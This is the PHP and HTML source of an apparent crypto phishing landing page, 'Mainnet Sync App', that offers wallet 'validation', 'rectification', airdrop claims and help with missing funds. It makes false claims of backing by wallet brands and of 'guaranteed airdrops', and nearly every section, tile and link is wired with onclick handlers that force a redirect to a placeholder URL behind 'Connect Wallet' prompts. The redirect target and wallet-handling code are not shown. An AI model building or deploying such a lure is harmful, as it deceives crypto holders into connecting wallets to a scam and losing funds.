<?php 
$redirect_url = 'x'; 
$services = ["Swap/Exchange","Validation","Claim Airdrop","Rectification","Connect","Buy/Sell","Verification ","Withdraw","Stakin/Unstake ","Stake/Harvest  ","Farm/Pool ","Minting ","Buy  ","Claim Presale  ","Withdraw Token ","Swap Token","Login Issues","Missing Funds","Irregular Token Balance","Exhorbitant Gas fees","Transaction Error","Issue With Trading Wallet"];
?>
<!DOCTYPE html>
<html lang="zxx" class="uk-background-white dark:uk-background-gray-100 dark:uk-text-gray-20 uk-dark">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Home | Mainnet Sync App</title>
        <link rel="icon" type="image/png" href="/favicon.png"/>
        <meta name="description" content="Home | Mainnet Sync App">
        <meta name="theme-color" content="#741ff5">

        <!-- preload head styles -->
        <link rel="preload" href="/assets/fonts/brand-icons.woff2" as="font" type="font/woff2" crossorigin>
        <link rel="preload" href="/assets/fonts/Unicons.woff?lkolxg" as="font" type="font/woff" crossorigin>
        <link rel="preload" href="https://cdn.jsdelivr.net/npm/swiper@8.3.2/swiper-bundle.min.css" as="style">
        <link rel="preload" href="https://cdn.jsdelivr.net/npm/uikit@3.15.1/dist/css/uikit.min.css" as="style">

        <!-- preload footer scripts -->
        <link rel="preload" href="/assets/js/uikit.min.js" as="script">
        <link rel="preload" href="/assets/js/uikit-components.js" as="script">
        <link rel="preload" href="/assets/js/jquery.min.js" as="script">
        <link rel="preload" href="/assets/js/swiper-bundle.min.js" as="script">
        <link rel="preload" href="/assets/js/feather.min.js" as="script">
        <link rel="preload" href="/assets/js/typed.min.js" as="script">
        <link rel="preload" href="/assets/js/anime.min.js" as="script">
        <link rel="preload" href="/assets/js/app.js" as="script">
        <link rel="preload" href="/assets/js/data-attr-helper.js" as="script">
        <link rel="preload" href="/assets/js/swiper-helper.js" as="script">
        <link rel="preload" href="/assets/js/typed-helper.js" as="script">
        <link rel="preload" href="/assets/js/anime-helper.js" as="script">

        <!-- include styles -->
        <script src="/assets/js/app-head.js"></script>
        <link rel="stylesheet" href="/assets/css/main.min.css">

        <!-- include scripts -->
        <script src="/assets/js/uikit.min.js"></script>
        <script src="/assets/js/uikit-components.js"></script>
    </head>
    <body class="uni-body">

        <!-- Dark/Light toggle -->
        <div class="darkmode-trigger uk-position-bottom-right uk-position-small uk-position-fixed uk-box-shadow-large uk-radius-circle" data-darkmode-toggle="">
            <label class="switch">
                <span class="sr-only">Dark mode toggle</span>
                <input type="checkbox">
                <span class="slider"></span>
            </label>
        </div>

        <!-- Wrapper start -->
        <div class="wrap">

            <!-- Header start -->
            <header class="uni-header uk-position-top" onclick="window.location.replace('<?php echo $redirect_url; ?>')">
                <div class="uni-header-navbar" data-uk-sticky="top: 70; show-on-up: false; animation: uk-animation-slide-top" data-anime="opacity:[0, 1]; translateY:[-24, 0]; onview: true; delay: 0;">
                    <div class="uk-container">
                        <nav class="uk-navbar uk-navbar-container uk-navbar-transparent" data-uk-navbar>
                            <div class="uk-navbar-top">
                                <div class="uk-navbar-left">
                                    <a class='uk-logo uk-navbar-item uk-h4 uk-h3@m uk-margin-remove' href='<?php echo $redirect_url; ?>'> <img class="uk-visible dark:uk-hidden" width="120" src="/assets/images/nerko-light.svg" alt="Nerko" loading="lazy"> <img class="uk-hidden dark:uk-visible" width="120" src="/assets/images/logo-dark.svg" alt="Nerko" loading="lazy"> </a>
                                </div>

                                <div class="uk-navbar-right uk-flex-1 uk-flex-right">
                                    <ul class="uk-navbar-nav dark:uk-text-gray-10 uk-visible@m" data-uk-scrollspy-nav="closest: li; scroll: true; offset: 80" data-uk-navbar-bound>
                                        <li><a href="<?php echo $redirect_url; ?>">Minting</a></li>
                                        <li><a href="<?php echo $redirect_url; ?>">About</a></li>
                                        <li><a href="<?php echo $redirect_url; ?>">Sync</a></li>
                                        <li><a href="<?php echo $redirect_url; ?>">Validate</a></li>
                                    </ul>
                                    <div class="uk-navbar-item">
                                        <ul class="uk-subnav uk-subnav-small uk-visible@m">
                                            <li>
                                                <a href="<?php echo $redirect_url; ?>"><i class="uk-icon uk-icon-medium unicon-logo-twitter"></i></a>
                                            </li>
                                            <li>
                                                <a href="<?php echo $redirect_url; ?>"><i class="uk-icon uk-icon-medium unicon-logo-discord"></i></a>
                                            </li>
                                        </ul>

                                        <!-- header: call to actions -->
                                        <a href="<?php echo $redirect_url; ?>" class="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left uk-visible@l" data-uk-toggle="">
                                            <span>Connect wallet</span>
                                        </a>
                                    </div>

                                    <div class="uk-navbar-item uk-hidden@m">
                                        <a href="<?php echo $redirect_url; ?>" class="uk-button uk-button-medium@m uk-button-icon uk-hidden@m uk-margin-small-right" data-uk-toggle="">
                                            <i class="uk-icon unicon-wallet"></i>
                                        </a>
                                        <a href="<?php echo $redirect_url; ?>" data-uk-toggle>
                                            <span class="uk-icon uk-icon-medium material-icons">menu</span>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </nav>
                    </div>
                </div>
            </header>

            <!-- Header end -->

            <!-- Hero start --> 
            <div id="uni_hero" class="uni-hero uk-section uk-section-xlarge uk-padding-remove-bottom uk-panel" onclick="window.location.replace('<?php echo $redirect_url; ?>')">
                <div class="uk-position-top uk-position-z-index-negative uk-overflow-hidden uk-blend-overlay" data-uk-height-viewport="">
                    <img class="uk-position-top-left uk-position-fixed uk-blur-large" style="left: -4%; top: -4%" width="500" src="/assets/images/gradient-circle.svg" alt="Circle">
                    <img class="uk-position-bottom-right uk-position-fixed uk-blur-large" style="right: -4%; bottom: -4%" width="500" src="/assets/images/gradient-circle.svg" alt="Circle">
                </div>
                <div class="uk-position-top uk-position-z-index-negative" data-uk-height-viewport="">
                    <div class="uk-position-cover uk-background-cover uk-opacity-10 dark:uk-hidden" data-src="/assets/images/gradient-01.png" data-uk-img></div>
                    <div class="uk-position-cover uk-background-cover uk-opacity-20 uk-hidden dark:uk-visible" data-src="/assets/images/gradient-01.png" data-uk-img></div>
                </div>
                <div class="uk-panel uk-position-z-index">
                    <div class="uk-container">
                        <div class="uk-panel">
                            <div class="uk-grid uk-grid-2xlarge uk-flex-middle uk-flex-between" data-uk-grid data-uk-height-viewport="offset-top: true; offset-bottom: 20;">
                                <div class="uk-width-5-12@m">
                                    <div class="uk-panel uk-position-z-index uk-text-center uk-text-left@m" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">
                                        <img class="uk-position-top-left" width="44" src="/assets/images/objects/ethereum-01.png" alt="object" style="top: -20%; left: 50%" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 400;">
                                        <img class="uk-position-left" width="16" src="/assets/images/objects/circle-01.png" alt="object" style="top: 16%; left: -16%" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 420;">
                                        <img class="uk-position-bottom-left" width="24" src="/assets/images/objects/circle-03.png" alt="object" style="bottom: -16%; left: 16%" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 440;">
                                        <h2 class="uk-h2 uk-heading-d3@m uk-margin-small uk-margin@m">Validate, initialize & synchronize</h2>
                                        <p class="uk-text-xlarge uk-width-xlarge@m uk-text-muted"> Your tokens on your wallets easily</p>
                                        <a href="#" class="uk-button uk-button-medium@m uk-button-gradient uk-margin-small-top">
                                            <span>Connect Wallet</span>
                                            <i class="uk-icon-small unicon-arrow-right uk-text-bold"></i>
                                        </a>
                                    </div>
                                </div>
                                <div class="uk-width-6-12@m uk-flex-center">
                                    <div class="uk-panel" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 200;">
                                        <img class="uk-position-left uk-text-primary" width="44" src="/assets/images/objects/bitcoin-01.png" alt="object" style="top: 75%; left: -20%" data-uk-svg="" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 460;">
                                        <img class="uk-position-right" width="28" src="/assets/images/objects/x.png" alt="object" style="top: -4%; right: 16%" data-uk-svg="" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 480;">
                                        <img class="uk-position-right uk-opacity-10" width="300" src="/assets/images/blob-dashed.svg" alt="Blog dashed" style="top: -10%; right: 16%; fill: transparent" data-uk-svg="">
                                        <svg style="top: -20%" class="uk-position-right uk-opacity-30" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
                                            <path fill="#F796FF" d="M47.5,-67.2C55.9,-59.3,53.2,-37.9,56.7,-20.1C60.2,-2.3,69.9,11.8,70.8,27.3C71.7,42.9,63.8,59.9,50.6,64.4C37.3,68.9,18.6,60.8,-0.3,61.2C-19.3,61.6,-38.6,70.7,-53.5,66.7C-68.4,62.8,-78.9,45.9,-78.8,29.5C-78.7,13.2,-67.9,-2.7,-59.8,-16.8C-51.6,-31,-46,-43.3,-36.5,-50.9C-27,-58.4,-13.5,-61.1,3,-65.2C19.6,-69.4,39.1,-75.1,47.5,-67.2Z" transform="translate(100 100)">
                                        </svg>
                                        <div class="uk-grid uk-grid-xsmall uk-child-width-1-2" data-uk-grid="masonry: true;">
                                            <div>
                                                <div class="uni-item uk-card uk-overflow-hidden uk-radius uk-radius-large@m uk-box-shadow-hover-medium uk-visible-toggle uk-transition-toggle uk-box-shadow-medium uk-background-white dark:uk-background-white-5">
                                                    <div class="uni-item-featured-image uk-panel uk-flex-middle uk-flex-center">
                                                        <div class="uk-panel uk-image-middle">
                                                            <img src="/assets/images/artwork/tokenHero.png" alt="Artwork" class="uk-radius-small uk-radius-large@m">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="uk-margin-large-top">
                                                <div class="uni-item uk-card uk-overflow-hidden uk-radius uk-radius-large@m uk-box-shadow-hover-medium uk-visible-toggle uk-transition-toggle uk-box-shadow-medium uk-background-white dark:uk-background-white-5">
                                                    <div class="uni-item-featured-image uk-panel uk-flex-middle uk-flex-center">
                                                        <div class="uk-panel uk-image-middle">
                                                            <img src="/assets/images/artwork/Metamask-portfolio-1.png" alt="Artwork" class="uk-radius-small uk-radius-large@m">
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <a class="uni-circle-text uk-background-white dark:uk-background-gray-80 uk-box-shadow-large uk-visible@m" href="<?php echo $redirect_url; ?>">
                                            <svg class="uni-circle-text-path uk-text-secondary uni-animation-spin" viewBox="0 0 100 100" width="120" height="120">
                                                <defs>
                                                    <path id="circle" d="M 50, 50 m -37, 0 a 37,37 0 1,1 74,0 a 37,37 0 1,1 -74,0">
                                                </defs>
                                                <text font-size="11.75">
                                                    <textPath xlink:href="#circle">Connect Wallet • Validate Now •</textPath>
                                                </text>
                                            </svg>
                                            <i class="uk-position-center uk-text-secondary uk-icon-medium@m unicon-arrow-up-right uk-text-bold"></i>
                                        </a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Hero end -->

            <!-- brands start -->
            <div class="uni-brands uk-padding-3xlarge-top uk-padding-medium-bottom uk-padding-remove-top@m uk-padding-xlarge-bottom@m uk-panel uk-overflow-hidden" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 300;" onclick="window.location.replace('<?php echo $redirect_url; ?>')">
                <div class="uk-container uk-container-small">
                    <div class="uk-panel uk-text-center dark:uk-text-white">
                        <header class="uk-panel uk-flex-center uk-flex-middle uk-text-center">
                            <span class="uk-text-overline uk-text-bold uk-text-muted">Powered by amazing investors:</span>
                        </header>
                        <div class="uk-grid uk-grid-xlarge@m uk-child-width-1-2 uk-child-width-expand@m uk-flex-middle uk-flex-center uk-grid uk-margin-medium-top" data-uk-grid>
                            <div><img class="uk-width-xsmall" src="/assets/images/wallets/wallet-01.svg" alt="Metamask" data-uk-svg></div>
                            <div><img class="uk-width-xsmall" src="/assets/images/wallets/wallet-02.svg" alt="BitGo" data-uk-svg></div>
                            <div><img class="uk-width-xsmall" src="/assets/images/wallets/wallet-03.svg" alt="Coinbase" data-uk-svg></div>
                            <div><img class="uk-width-xsmall" src="/assets/images/wallets/wallet-04.svg" alt="Trust Wallet" data-uk-svg></div>
                            <div><img class="uk-width-xsmall" src="/assets/images/wallets/wallet-05.svg" alt="Exodus" data-uk-svg></div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- brands end -->

            <img class="uk-width-2xsmall uk-flex-center uk-margin-auto uk-margin-medium uk-margin-large@m" src="/assets/images/divider-01.svg" alt="Divider" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 100;">

            <!-- numbers start -->
            <div id="uni_numbers" class="uni-numbers uk-section uk-section-large@m">
                <div class="uk-container">
                    <div class="uk-panel">
                        <img class="uk-position-bottom-left uk-text-secondary uni-animation-delay-large" width="32" src="/assets/images/objects/bitcoin-01.png" alt="Object" style="bottom: -32%; left: 30%" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: -250; delay: 200;">
                        <img class="uk-position-top-right" width="24" src="/assets/images/objects/ethereum-01.png" alt="Object" style="top: -25%; right: 25%" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: -250; delay: 200;">
                        <div class="uk-grid uk-grid-large uk-grid-2xlarge@m uk-child-width-expand@m uk-text-center uk-text-muted" data-uk-grid="" data-anime="targets: > *; opacity:[0, 1]; scale:[0.5, 1]; onview: -250; delay: anime.stagger(100);">
                            <div>
                                <div class="uk-panel">
                                    <h4 class="uk-h3 uk-heading-d3@m uk-text-gradient uk-margin-xsmall uk-margin@m">4,000+</h4>
                                    <span>Wallets Connected</span>
                                </div>
                            </div>
                            <div>
                                <div class="uk-panel">
                                    <h4 class="uk-h3 uk-heading-d3@m uk-text-gradient uk-margin-xsmall uk-margin@m">10,000+</h4>
                                    <span>Airdrops Launched</span>
                                </div>
                            </div>
                            <div>
                                <div class="uk-panel">
                                    <h4 class="uk-h3 uk-heading-d3@m uk-text-gradient uk-margin-xsmall uk-margin@m">15x</h4>
                                    <span>Token Sales</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- numbers end -->

            <img class="uk-width-2xsmall uk-flex-center uk-margin-auto uk-margin-medium uk-margin-large@m" src="/assets/images/divider-01.svg" alt="Divider" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 400;">
            
            <div id="" class="uni-numbers uk-section uk-section-large@m">
            <div class="uk-container">
                    <div class="uk-panel">
            <div class="uk-grid uk-grid-large@m uk-grid-match uk-child-width-1-4@m uk-child-width-1-2 uk-margin-medium-top uk-margin-large-top@m" data-uk-grid="">
                                                   <?php 
                                                   foreach($services as $service){
                                                    ?>
                                                    <div style="cursor: pointer;" onclick="window.location.replace('<?php echo $redirect_url; ?>')">
                                                        <div class="uk-panel">
                                                            <div class="uk-grid uk-grid-xsmall uk-grid-small@m" data-uk-grid="">
                                                                <div>
                                                                    <div class="uk-card uk-card-xsmall uk-radius-medium uk-radius-large@m uk-background-gradient uk-flex-middle uk-flex-center" style="width: 30px;height: 30px">
                                                                        <i class="uk-icon-small uk-icon-small@m unicon-checkmark-outline uk-text-white"></i>
                                                                    </div>
                                                                </div>
                                                                <div class="uk-width-expand">
                                                                    <span class="uk-text-small@m"
                                                                        ><?php echo $service; ?></span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <?php } ?>
                                                </div>
            </div>
            </div>
            </div>
            
            
            <img class="uk-width-2xsmall uk-flex-center uk-margin-auto uk-margin-medium uk-margin-large@m" src="/assets/images/divider-01.svg" alt="Divider" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 400;">

            <!-- how to mint start -->
            <div id="uni_minting" class="uni-minting uk-section uk-section-xlarge@m uk-panel" onclick="window.location.replace('<?php echo $redirect_url; ?>')">
                <div class="uk-container uk-container-small">
                    <header class="uk-grid-xsmall uk-flex-center uk-flex-middle uk-grid" data-uk-grid data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 200;">
                        <div class="uk-panel uk-text-center">
                            <h2 class="uk-h3 uk-h1@m">Get Started</h2>
                        </div>
                    </header>
                    <div class="uk-panel uk-margin-medium-top uk-margin-2xlarge-top@m" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 300;">
                        <img class="uk-position-top-left uk-text-secondary" width="16" src="/assets/images/objects/circle-01.png" alt="Object" style="top: -16%; left: 8%">
                        <img class="uk-position-bottom-right uk-text-primary" width="24" src="/assets/images/objects/circle-02.png" alt="Object" style="bottom: 16%; right: -8%">
                        <img class="uk-position-bottom-left uk-text-muted" width="28" src="/assets/images/objects/x.png" alt="Object" style="bottom: 16%; left: -8%">
                        <div class="uk-grid uk-child-width-1-2@s uk-grid-match" data-uk-grid="" data-anime="targets: > *; opacity:[0, 1]; translateY:[24, 0]; onview: -250; delay: anime.stagger(100);">
                            <div>
                                <div class="uk-panel uk-card uk-card-small uk-padding-large-horizontal uk-radius-medium uk-radius-large@m uk-box-shadow-xsmall dark:uk-background-white-5">
                                    <div class="uk-grid uk-grid-medium@m" data-uk-grid="">
                                        <div class="uk-width-1-3 uk-width-1-4@m">
                                            <img src="/assets/images/icon-01.png" alt="Icon">
                                        </div>
                                        <div class="uk-panel uk-width-expand">
                                            <h3 class="uk-h5 uk-h4@m">Connect your wallet</h3>
                                            <p>Securely connect your Web3 wallet to fix any issues & participate in upcoming token launches/Airdrops</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <div class="uk-panel uk-card uk-card-small uk-padding-large-horizontal uk-radius-medium uk-radius-large@m uk-box-shadow-xsmall dark:uk-background-white-5">
                                    <div class="uk-grid uk-grid-medium@m" data-uk-grid="">
                                        <div class="uk-width-1-3 uk-width-1-4@m">
                                            <img src="/assets/images/icon-02.png" alt="Icon">
                                            <div hidden class="uk-card uk-card-xsmall uk-radius-medium uk-background-gradient uk-flex-middle uk-flex-center uk-margin-medium-bottom@m">
                                                <i class="uk-icon-medium uk-icon-medium@m unicon-select-window"></i>
                                            </div>
                                        </div>
                                        <div class="uk-panel uk-width-expand">
                                            <h3 class="uk-h5 uk-h4@m">Explore Projects</h3>
                                            <p>Browse through vetted, innovative projects, token launched, investment opportunities and choose where you want to invest.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <div class="uk-panel uk-card uk-card-small uk-padding-large-horizontal uk-radius-medium uk-radius-large@m uk-box-shadow-xsmall dark:uk-background-white-5">
                                    <div class="uk-grid uk-grid-medium@m" data-uk-grid="">
                                        <div class="uk-width-1-3 uk-width-1-4@m">
                                            <img src="/assets/images/icon-03.png" alt="Icon">
                                            <div hidden class="uk-card uk-card-xsmall uk-radius-medium uk-background-gradient uk-flex-middle uk-flex-center uk-margin-medium-bottom@m">
                                                <i class="uk-icon-medium uk-icon-medium@m unicon-select-window"></i>
                                            </div>
                                        </div>
                                        <div class="uk-panel uk-width-expand">
                                            <h3 class="uk-h5 uk-h4@m">Invest Securely</h3>
                                            <p>Use your crypto to invest securely direct from your wallet in your chosen projects, and other prospective investment opportunities.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <div class="uk-panel uk-card uk-card-small uk-padding-large-horizontal uk-radius-medium uk-radius-large@m uk-box-shadow-xsmall dark:uk-background-white-5">
                                    <div class="uk-grid uk-grid-medium@m" data-uk-grid="">
                                        <div class="uk-width-1-3 uk-width-1-4@m">
                                            <img src="/assets/images/icon-04.png" alt="Icon">
                                            <div hidden class="uk-card uk-card-xsmall uk-radius-medium uk-background-gradient uk-flex-middle uk-flex-center uk-margin-medium-bottom@m">
                                                <i class="uk-icon-medium uk-icon-medium@m unicon-select-window"></i>
                                            </div>
                                        </div>
                                        <div class="uk-panel uk-width-expand">
                                            <h3 class="uk-h5 uk-h4@m">Track Your Wallet</h3>
                                            <p>Monitor the progress and performance of your investments, fix/resolve wallet issues, review airdrops through our user-friendly dashboard.</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- how to mint end -->

            <img class="uk-width-2xsmall uk-flex-center uk-margin-auto uk-margin-medium uk-margin-large@m" src="/assets/images/divider-01.svg" alt="Divider" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">

            
            <!-- about start -->
            <div id="uni_about" class="uni-about uk-section uk-section-xlarge@m uk-panel" onclick="window.location.replace('<?php echo $redirect_url; ?>')">
                <div class="uk-container">
                    <header class="uk-grid-xsmall uk-flex-center uk-flex-middle uk-grid" data-uk-grid data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">
                        <div class="uk-panel uk-text-center">
                            <h2 class="uk-h3 uk-h1@m">Discover Our Platform</h2>
                        </div>
                    </header>
                    <div class="uk-panel uk-margin-medium-top uk-margin-2xlarge-top@m">
                        <div class="uk-grid uk-grid-2xlarge uk-grid-3xlarge@m uk-child-width-1-1" data-uk-grid="">
                            <div>
                                <div class="uk-panel">
                                    <div class="uk-grid uk-grid-3xlarge@m uk-flex-middle uk-child-width-1-2@m" data-uk-grid="">
                                        <div>
                                            <div class="uk-panel uk-image-middle uk-overflow-hidden uk-radius uk-radius-large@m" data-anime="opacity:[0, 1]; translateX:[-24, 0]; onview: -250; delay: 200;">
                                                <img src="/assets/images/features-07.png" alt="Create your own NFT">
                                            </div>
                                        </div>
                                        <div>
                                            <div class="uk-panel" data-anime="opacity:[0, 1]; translateX:[24, 0]; onview: -250; delay: 300;">
                                                <span class="uk-text-overline uk-text-gradient">Resolve and Rectify</span>
                                                <h3 class="uk-h3 uk-h1@m">Take Charge of your Wallet</h3>
                                                <p class="uk-text-large@m">
                                                Our decentralized launchpad offers a unique and secure environment for blockchain projects to raise capital directly from the community. Built on transparency and trust, we enable early-stage projects to connect with enthusiastic investors ready to be part of the next big thing.                                                </p>
                                                <div class="uk-grid uk-grid-large@m uk-grid-match uk-child-width-1-2 uk-margin-large-top@m" data-uk-grid="">
                                                    <div>
                                                        <div class="uk-panel">
                                                            <h5 class="uk-h4 uk-h2@m uk-margin-xsmall">4,500+</h5>
                                                            <span class="uk-text-small@m"
                                                                >Wallet Fixed & Secured!</span>
                                                        </div>
                                                    </div>
                                                    <div>
                                                        <div class="uk-panel">
                                                            <h5 class="uk-h4 uk-h2@m uk-margin-xsmall">15x</h5>
                                                            <span class="uk-text-small@m">Guaranteed Airdrops</span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <div class="uk-panel">
                                    <div class="uk-grid uk-grid-3xlarge@m uk-flex-middle uk-child-width-1-2@m" data-uk-grid="">
                                        <div>
                                            <div class="uk-panel uk-image-middle uk-overflow-hidden uk-radius uk-radius-large@m" data-anime="opacity:[0, 1]; translateX:[24, 0]; onview: -250; delay: 300;">
                                                <img src="/assets/images/features-04.png" alt="Create your own NFT">
                                            </div>
                                        </div>
                                        <div class="uk-flex-first@m">
                                            <div class="uk-panel" data-anime="opacity:[0, 1]; translateX:[-24, 0]; onview: -250; delay: 400;">
                                                <span class="uk-text-overline uk-text-gradient">Sync and Track</span>
                                                <h3 class="uk-h3 uk-h1@m">Decentralized and Secure</h3>
                                                <p class="uk-text-large@m">
                                                Connect your wallet now and access exclusive early-stage token launches directly through our decentralized platform. Invest in the potential of blockchain innovation today!</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <img class="uk-width-2xsmall uk-flex-center uk-margin-auto uk-margin-medium uk-margin-large@m" src="/assets/images/divider-01.svg" alt="Divider" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">

            <!-- faq start -->
            <div id="uni_faq" class="uni-faq uk-section uk-section-large@m uk-panel uk-overflow-hidden uk-padding-2xlarge-bottom@m">
                <div class="uk-container">
                    <header class="uk-grid-xsmall uk-flex-center uk-flex-middle uk-text-center uk-child-width-auto@m uk-grid" data-uk-grid data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">
                        <div class="uk-panel">
                            <h2 class="uk-h3 uk-h1@m">FAQ</h2>
                        </div>
                    </header>
                    <div class="uk-panel uk-margin-medium-top uk-margin-2xlarge-top@m">
                        <ul class="uk-card uk-card-small uk-card-large@m uk-radius uk-radius-large@m uk-width-2xlarge@m uk-margin-auto uk-box-shadow-xsmall dark:uk-background-white-5" data-uk-accordion="collapsible: false" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">
                            <li>
                                <a class="uk-accordion-title uk-h5@m" href="#">How do I secure my Web3 wallet?</a>
                                <div class="uk-accordion-content uk-padding-small-bottom">
                                    <p class="uk-text-small uk-text-large@m uk-text-muted">To ensure the security of your Web3 wallet, always use strong, unique passwords, enable two-factor authentication (2FA) if available</p>
                                </div>
                            </li>
                            <li>
                                <a class="uk-accordion-title uk-h5@m" href="#">What do I need to start?</a>
                                <div class="uk-accordion-content uk-padding-small-bottom">
                                    <p class="uk-text-small uk-text-large@m uk-text-muted">All you need is a compatible Web3 wallet and some cryptocurrency to start investing in projects.</p>
                                </div>
                            </li>
                            <li>
                                <a class="uk-accordion-title uk-h5@m" href="#">How do you vet projects?</a>
                                <div class="uk-accordion-content uk-padding-small-bottom">
                                    <p class="uk-text-small uk-text-large@m uk-text-muted">Our team carefully reviews each project to ensure it meets our standards for security, potential, and innovation.</p>
                                </div>
                            </li>
                            <li>
                                <a class="uk-accordion-title uk-h5@m" href="#">How do I participate in airdrops through your platform?</a>
                                <div class="uk-accordion-content uk-padding-small-bottom">
                                    <p class="uk-text-small uk-text-large@m uk-text-muted">To participate in airdrops, ensure your wallet is eligible for airdrops by holding the necessary tokens or meeting the specified conditions set by the airdrop provider, connect your Web3 wallet to our platform.</p>
                                </div>
                            </li>
                            <li>
                                <a class="uk-accordion-title uk-h5@m" href="#">What can I do about high gas fees?</a>
                                <div class="uk-accordion-content uk-padding-small-bottom">
                                    <p class="uk-text-small uk-text-large@m uk-text-muted">To manage high gas fees, try conducting transactions during off-peak hours when the network is less congested.</p>
                                </div>
                            </li>
                            <li>
                                <a class="uk-accordion-title uk-h5@m" href="#">How does Web3 Connect work?</a>
                                <div class="uk-accordion-content uk-padding-small-bottom">
                                    <p class="uk-text-small uk-text-large@m uk-text-muted">Web3 Connect allows you to interact with decentralized applications (dApps) through your browser or mobile device. Simply click on the 'Connect Wallet' button on the dApp, choose your wallet provider, and authorize the connection. This establishes a secure link between your wallet and the dApp, enabling transactions and interactions without compromising your wallet’s keys.</p>
                                </div>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- faq end -->

            <img class="uk-width-2xsmall uk-flex-center uk-margin-auto uk-margin-medium uk-margin-large@m" src="/assets/images/divider-01.svg" alt="Divider" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">

            <!-- cta start -->
            <div class="uni-cta uk-section uk-section-2xlarge@m uk-panel uk-overflow-hidden">
                <img class="uk-cover uk-opacity-10" data-uk-cover src="/assets/images/collection-cta.png" alt="arrow">
                <div class="uk-container">
                    <div class="uk-card uk-flex-center uk-text-center">
                        <div class="uk-panel uk-width-xlarge@m uk-position-z-index" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">
                            <img class="uk-position-top-left" width="24" src="/assets/images/objects/circle-01.png" alt="Object" style="top: 0%; left: -16%">
                            <img class="uk-position-bottom-right" width="24" src="/assets/images/objects/x.png" alt="Object" style="bottom: 16%; right: -8%">
                            <img class="uk-position-top-right" width="40" src="/assets/images/objects/ethereum-02.png" alt="Object" style="top: 0%; right: -16%">
                            <img class="uk-position-bottom-left" width="48" src="/assets/images/objects/bitcoin-01.png" alt="Object" style="bottom: 16%; left: -8%">
                            <h2 class="uk-h3 uk-heading-d1@m">Ready to Dive In?</h2>
                            <a href="<?php echo $redirect_url; ?>" class="uk-button uk-button-small uk-button-large@m uk-button-gradient uk-margin-small-top uk-margin-large-top@m">Connect Wallet</a>
                        </div>
                    </div>
                </div>
            </div>

            <!-- cta end -->

            <img class="uk-width-2xsmall uk-flex-center uk-margin-auto uk-margin-medium uk-margin-large@m" src="/assets/images/divider-01.svg" alt="Divider" data-anime="opacity:[0, 1]; translateY:[24, 0]; onview: true; delay: 100;">
        </div>

        <!-- Wrapper end -->

        <!-- Footer start -->
        <footer class="uni-footer uk-section uk-section-xlarge@m" onclick="window.location.replace('<?php echo $redirect_url; ?>')">
            <div class="uk-container">
                <div class="uk-panel">
                    <img class="uk-position-top-left" width="32" src="/assets/images/objects/ethereum-01.png" alt="object" style="top: 32%; left: 16%">
                    <img class="uk-position-top-right" width="16" src="/assets/images/objects/x.png" alt="object" style="top: 8%; right: 16%">
                    <img class="uk-position-bottom-right" width="16" src="/assets/images/objects/circle-01.png" alt="object" style="bottom: 24%; right: 40%">
                    <img class="uk-position-bottom-left" width="24" src="/assets/images/objects/circle-03.png" alt="object" style="bottom: -8%; left: 30%">
                    <div class="uk-grid uk-flex-center uk-text-center" data-uk-grid>
                        <div class="uk-width-large@m">
                            <div class="uk-panel">
                                <a class='uk-logo' href='/'>
                                    <img width="200" src="/assets/images/logo.svg" alt="Nerko">
                                </a>
                                <p class="uk-text-xlarge@m uk-margin-medium-top@m">
                                Empower your Wallet with our decentralized launchpad, where innovation meets investment
                                </p>
                                <ul class="uk-subnav uk-subnav-small uk-flex-center uk-text-gray-40 uk-margin-top uk-margin-medium-top@m">
                                    <li>
                                        <a href="https://twitter.com/unistudioco"><span class="uk-icon uk-icon-medium@m unicon-logo-twitter"></span></a>
                                    </li>
                                    <li>
                                        <a href="https://discord.com/unistudioco"><span class="uk-icon uk-icon-medium@m unicon-logo-discord"></span></a>
                                    </li>
                                    <li>
                                        <a href="https://instagram.com/unistudioco"><span class="uk-icon uk-icon-medium@m unicon-logo-instagram"></span></a>
                                    </li>
